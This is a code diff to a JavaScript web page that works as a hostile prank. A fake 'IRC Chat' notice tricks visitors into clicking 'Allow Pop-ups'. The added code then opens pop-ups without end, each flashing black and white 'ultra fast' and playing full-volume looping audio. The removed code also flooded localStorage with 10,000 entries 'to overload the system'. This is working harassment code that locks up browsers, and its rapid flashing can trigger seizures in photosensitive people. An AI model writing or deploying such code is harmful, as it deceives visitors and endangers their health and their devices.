@@ -40,75 +40,83 @@
         audio.volume = 1; // Set volume to full
 
         function startEffect() {
-            createPopups(50); // Create multiple pop-ups (sequentially, 50 pop-ups for example)
+            // Open the first pop-up asking for permission
+            createFirstPopup();
         }
 
-        function createPopups(count) {
-            let popupIndex = 0;
-            let audioPlayed = false; // Flag to check if audio has been played in a pop-up
-
-            function openNextPopup() {
-                if (popupIndex < count) {
-                    // Open the pop-up window here
-                    let popup = window.open('', '', 'width=300,height=200');
-                    
-                    if (popup) {
-                        // Write initial IRC-like content asking to allow pop-ups
-                        popup.document.write(`
-                            <html>
-                                <head>
-                                    <title>Pop-up</title>
-                                    <style>
-                                        body {
-                                            background-color: white;
-                                        }
-                                    </style>
-                                </head>
-                                <body>
-                                    <div id="ircMessage">
-                                        <p><strong>IRC Chat:</strong> Welcome to our site!</p>
-                                        <p><strong>System:</strong> Warning: Pop-ups are blocked. Please allow pop-ups to continue.</p>
-                                        <p><strong>IRC Chat:</strong> To make the chatroom open, enable pop-ups in your browser.</p>
-                                    </div>
-                                </body>
-                            </html>
-                        `);
-
-                        // Wait for the user to interact with the pop-up (they must allow it)
-                        popup.document.body.innerHTML += '<button id="allowButton">Allow Pop-ups</button>';
-
-                        // Add a click listener for the "Allow Pop-ups" button
-                        popup.document.getElementById('allowButton').onclick = function() {
-                            // Once the user clicks "Allow Pop-ups", start the sound and flashing
-                            if (!audioPlayed) {
-                                let popupAudio = popup.document.createElement('audio');
-                                popupAudio.src = 'aaa.mp3';
-                                popupAudio.loop = true;
-                                popupAudio.volume = 1; // Set volume to full
-                                popupAudio.play(); // Play audio in the pop-up
-                                audioPlayed = true; // Ensure audio is only played once
-
-                                // Start flashing the pop-up background after the button is clicked
-                                startFlashingColors(popup);
-
-                                // Manipulate local storage to overload the system
-                                for (let i = 0; i < 10000; i++) {
-                                    localStorage.setItem('key' + i, 'value' + i);
+        function createFirstPopup() {
+            let popup = window.open('', '', 'width=300,height=200');
+            
+            if (popup) {
+                // Write the content for the first pop-up asking the user to allow pop-ups
+                popup.document.write(`
+                    <html>
+                        <head>
+                            <title>Pop-up</title>
+                            <style>
+                                body {
+                                    background-color: white;
                                 }
-                            }
+                            </style>
+                        </head>
+                        <body>
+                            <div id="ircMessage">
+                                <p><strong>IRC Chat:</strong> Welcome to our site!</p>
+                                <p><strong>System:</strong> Warning: Pop-ups are blocked. Please allow pop-ups to continue.</p>
+                                <p><strong>IRC Chat:</strong> To make the chatroom open, enable pop-ups in your browser.</p>
+                            </div>
+                            <button id="allowButton">Allow Pop-ups</button>
+                        </body>
+                    </html>
+                `);
 
-                            // Optionally close the pop-up (or leave it open)
-                            // popup.close(); // Un-comment this line if you want to close the pop-up after clicking "Allow Pop-ups"
-                            
-                            // Proceed to the next pop-up after a small delay
-                            popupIndex++;
-                            setTimeout(openNextPopup, 200); // Set a small delay before opening the next pop-up
-                        };
-                    }
-                }
+                // Add click listener to the "Allow Pop-ups" button
+                popup.document.getElementById('allowButton').onclick = function() {
+                    // After the user clicks "Allow Pop-ups", open the next pop-up
+                    createSecondPopup(popup);
+                };
             }
+        }
 
-            openNextPopup(); // Start opening pop-ups
+        function createSecondPopup(previousPopup) {
+            // Create the second pop-up after the first one is interacted with
+            let secondPopup = window.open('', '', 'width=300,height=200');
+            
+            if (secondPopup) {
+                secondPopup.document.write(`
+                    <html>
+                        <head>
+                            <title>Second Pop-up</title>
+                            <style>
+                                body {
+                                    background-color: white;
+                                }
+                            </style>
+                        </head>
+                        <body>
+                            <div id="ircMessage">
+                                <p><strong>System:</strong> You have successfully allowed pop-ups.</p>
+                                <p><strong>System:</strong> The flashing begins now!</p>
+                            </div>
+                        </body>
+                    </html>
+                `);
+
+                // Start flashing black and white ultra fast on the second pop-up
+                startFlashingColors(secondPopup);
+
+                // Start playing audio in the second pop-up
+                let popupAudio = secondPopup.document.createElement('audio');
+                popupAudio.src = 'aaa.mp3';
+                popupAudio.loop = true;
+                popupAudio.volume = 1; // Set volume to full
+                popupAudio.play(); // Play audio in the pop-up
+
+                // Continue opening more pop-ups (you can adjust the number of pop-ups here)
+                setTimeout(() => {
+                    createSecondPopup(previousPopup); // Recur to open more pop-ups
+                }, 500); // A small delay to prevent overloading instantly
+            }
         }
 
         function startFlashingColors(popup) {
